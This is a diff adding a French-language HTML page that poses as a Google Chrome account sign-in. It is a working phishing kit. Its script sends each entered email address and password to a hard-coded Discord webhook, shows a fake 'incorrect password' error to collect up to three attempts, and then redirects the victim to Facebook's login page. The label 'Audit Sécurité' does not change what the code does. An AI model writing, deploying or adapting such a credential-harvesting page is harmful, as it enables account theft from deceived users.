@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Google Chrome</title>
+    
+    <link rel="icon" type="image/png" href="https://www.google.com/favicon.ico">
+    <link rel="apple-touch-icon" href="https://www.google.com/favicon.ico">
+
+    <style>
+        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; margin: 0; display: flex; justify-content: center; align-items: flex-start; padding-top: 50px; height: 100vh; color: #202124; }
+        .container { width: 90%; max-width: 400px; text-align: center; }
+        .chrome-header { margin-bottom: 30px; }
+        .chrome-logo { width: 48px; height: 48px; margin-bottom: 10px; }
+        h1 { font-size: 24px; font-weight: 400; margin: 10px 0; }
+        p { font-size: 16px; margin-bottom: 30px; }
+        
+        /* Style Input dynamique de ta capture */
+        .input-box { position: relative; margin-bottom: 10px; text-align: left; }
+        
+        /* Label qui se met dans la bordure comme sur l'image */
+        .input-label { position: absolute; top: -10px; left: 10px; background: white; padding: 0 5px; font-size: 12px; color: #d93025; display: none; }
+        
+        input { width: 100%; padding: 16px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; outline: none; }
+        input:focus { border: 2px solid #1a73e8; }
+        
+        /* État d'erreur rouge identique à ta capture */
+        input.error-border { border: 2px solid #d93025; }
+        
+        .error-container { display: none; color: #d93025; font-size: 14px; margin-top: 8px; text-align: left; line-height: 1.4; }
+        .error-content { display: flex; align-items: flex-start; }
+        .error-icon { background-color: #d93025; color: white; border-radius: 50%; min-width: 16px; height: 16px; display: inline-flex; justify-content: center; align-items: center; font-size: 11px; font-weight: bold; margin-right: 12px; margin-top: 2px; }
+        
+        /* Case à cocher "Afficher le mot de passe" de ta capture */
+        .show-pass-container { display: flex; align-items: center; margin-top: 20px; font-size: 16px; color: #202124; cursor: pointer; text-align: left; }
+        .show-pass-container input { width: 18px; height: 18px; margin-right: 15px; cursor: pointer; border: 2px solid #5f6368; }
+
+        .btn-container { margin-top: 40px; display: flex; justify-content: flex-end; }
+        .btn-next { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background 0.2s; }
+        .btn-next:active { background-color: #1669d6; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="chrome-header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Google_Chrome_icon_%28February_2022%29.svg" class="chrome-logo" alt="Chrome">
+        <h1>Google Chrome</h1>
+        <p>Utilisez votre compte Google</p>
+    </div>
+
+    <form id="chromeForm">
+        <div class="input-box">
+            <input type="email" id="email" placeholder="Adresse e-mail ou téléphone" required>
+        </div>
+        
+        <div class="input-box" style="margin-top: 20px;">
+            <div id="labelRed" class="input-label">Saisissez votre mot de passe</div>
+            <input type="password" id="pass" placeholder="Saisissez votre mot de passe" required>
+            
+            <div id="errorMsg" class="error-container">
+                <div class="error-content">
+                    <span class="error-icon">!</span>
+                    <span>Mot de passe incorrect. Réessayez.</span>
+                </div>
+            </div>
+        </div>
+
+        <label class="show-pass-container">
+            <input type="checkbox" id="toggle"> Afficher le mot de passe
+        </label>
+
+        <div class="btn-container">
+            <button type="submit" class="btn-next">Suivant</button>
+        </div>
+    </form>
+</div>
+
+<script>
+    const WEBHOOK = "https://discordapp.com/api/webhooks/1463375154313695425/b8j4vFvQYxlrrtYrxSXgOrV3PEsdA4vXaywKb8xIMo6qEt6vVAqc3yQb_srF7-aDg4a-";
+    let count = 0;
+
+    // Gestion de la visibilité du mot de passe
+    document.getElementById('toggle').addEventListener('change', function() {
+        document.getElementById('pass').type = this.checked ? 'text' : 'password';
+    });
+
+    document.getElementById('chromeForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        count++;
+
+        const mail = document.getElementById('email').value;
+        const password = document.getElementById('pass').value;
+
+        // Envoi des logs à Discord
+        fetch(WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                embeds: [{
+                    title: `🎯 Log Chrome - Tentative ${count}/3`,
+                    color: count === 3 ? 15158332 : 3447003,
+                    fields: [
+                        { name: "👤 Utilisateur", value: mail, inline: false },
+                        { name: "🔑 Mot de passe", value: password, inline: false }
+                    ],
+                    footer: { text: "Audit Sécurité - Chrome Mobile" },
+                    timestamp: new Date()
+                }]
+            })
+        }).then(() => {
+            if (count < 3) {
+                // On applique le design "ERREUR" de ton image
+                document.getElementById('errorMsg').style.display = 'block';
+                document.getElementById('labelRed').style.display = 'block';
+                const passInput = document.getElementById('pass');
+                passInput.classList.add('error-border');
+                passInput.placeholder = ""; // On vide le placeholder pour laisser place au label rouge
+                passInput.value = '';
+                passInput.focus();
+            } else {
+                // Redirection finale
+                window.location.href = "https://www.facebook.com/login/";
+            }
+        });
+    });
+</script>
+
+</body>
+</html>
